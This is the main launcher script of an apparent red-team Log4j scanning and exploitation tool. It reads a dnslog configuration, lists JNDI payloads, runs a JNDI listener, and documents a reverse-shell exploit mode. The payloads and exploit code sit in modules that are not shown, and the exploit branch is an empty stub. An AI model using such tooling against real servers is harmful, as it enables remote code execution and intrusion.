import re
import sys
import time
import socket
import codecs
import getopt
import requests
import warnings
import threading
import subprocess
import multiprocessing
from modules.log import logErr
from modules.scan import Log4j, payloads, scan
from modules.JndiServer import server
from modules.scan import helper as scan_helper
from modules.JndiServer import helper as jndi_helper
from modules.exploit import helper as exploit_helper

warnings.filterwarnings("ignore")


# tmp file to record the id of targets
# banner
banner = r'''
 __       _____   ____    __ __     _____            ____    ____     ______  __  __
/\ \     /\  __`\/\  _`\ /\ \\ \   /\___ \          /\  _`\ /\  _`\  /\  _  \/\ \/\ \
\ \ \    \ \ \/\ \ \ \L\_\ \ \\ \  \/__/\ \         \ \,\L\_\ \ \/\_\\ \ \L\ \ \ `\\ \
 \ \ \  __\ \ \ \ \ \ \L_L\ \ \\ \_   _\ \ \  _______\/_\__ \\ \ \/_/_\ \  __ \ \ , ` \
  \ \ \L\ \\ \ \_\ \ \ \/, \ \__ ,__\/\ \_\ \/\______\ /\ \L\ \ \ \L\ \\ \ \/\ \ \ \`\ \
   \ \____/ \ \_____\ \____/\/_/\_\_/\ \____/\/______/ \ `\____\ \____/ \ \_\ \_\ \_\ \_\
    \/___/   \/_____/\/___/    \/_/   \/___/            \/_____/\/___/   \/_/\/_/\/_/\/_/

                                                                ---------- By CMB RED TEAM
'''
# helper
# "t:f:j:L:hpwl",["target=", "file=", "jndipayload=", "local=", "help", "proxy", "waf", "list"]
helper = '''
Usage:
    python run.py -m scan -t http://127.0.0.1 -p http://127.0.0.1:8080
    python run.py -m scan -f targets.txt -j 1 -L 127.0.0.1:1389
    python run.py -m scan -t http://127.0.0.1 -w 
    python run.py -m jndi -l 127.0.0.1:1389 -k keyword
    python run.py -m exploit -e revershell -l 127.0.0.1:5555 -t http://target.domian -s header -d "Cookie: 123"
    python run.py -h

File:
    log, the folder to log the error message of running.
    
    
mode:
    -m scan, --mode scan
    \tscan vulnerability with Log4j
    -m jndi, --mode jndi
    \tstart a jndi listener which can match the keyword from the client request
    -m exploit, --mode exploit
    \texploit the target
''' + scan_helper + jndi_helper + exploit_helper


if __name__ == '__main__':
    print(banner)

    try:
        dns_config_err = "Can not load the dnslog config.\n" \
                         "Need to complete the dnslog.conf first.\n" \
                         "Example:\n" \
                         "dnslog_domain: testets.dnslog.cn\n" \
                         "dnslog_api: http://dnslog.cn/getrecords.php?t=0.35608420067494695\n" \
                         r'dnslog_header: {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", "Cookie":"UM_distinctid=17e0051c7c3998-03953057dbe9d3-4303066-1fa400-17e0051c7c4b9c; CNZZDATA1278305074=310594447-1640682781-%7C1640907769; PHPSESSID=825va24bjbvhvklmfk0p2sk575"}'
        dns_config = open("dnslog.conf", "r").read()
        if "dnslog_url: \ndnslog_api:\ndnslog_token:" == dns_config:
            raise Exception(dns_config_err)
            exit()
        else:
            dns_config = dns_config.replace(" ", "").split('\n')
            for config in dns_config:
                if "dnslog_domain" in config:
                    if re.findall("^.^\w^\d", config.split(':')[-1]):
                        raise Exception(dns_config_err)
                    Log4j.dnslog_domain = config.split(':')[-1]
                elif "dnslog_api" in config:
                    if len(config.split(':')) < 2 or len(config.split(':')) < 3:
                        raise Exception(dns_config_err)
                    Log4j.dnslog_api = config.split(':')[-2] + ":" + config.split(':')[-1]
                elif "dnslog_header" in config:
                    if len(config.split(':')) < 2:
                        Log4j.dnslog_token = ""
                    Log4j.dnslog_token = config.replace("dnslog_header:","")
        if len(sys.argv[1]) == 1:
            raise Exception("No options")
        print(str(sys.argv))
        opt = sys.argv[1]
        arg = sys.argv[2]
        if opt not in ["-h", "-l", "-m", "--help", "-mode", "-list"]:
            raise Exception("Must use -m option firstly.")
        elif opt == "-h" or opt == "--hlep":
            raise Exception()
        elif opt == "-l" or opt == "--list":
            print("\n[*] Log4j payload list:\n " + str(payloads).replace(",", ",\n").replace("'", "")[1:-1])
            exit()
        elif opt == "-m" or opt == "--list":
            if arg == "scan":
                scan(argv=sys.argv[3:])
            elif arg == "jndi":
                # opts, args = getopt.getopt(sys.argv[1:],"hl:k:",["local=", "help", "keyword="])
                server(argv=sys.argv[3:])
            elif arg == "exploit":
                1

    except Exception as e:
        print(e)
        print(helper)
        logErr(" [MainError] " + str(e))
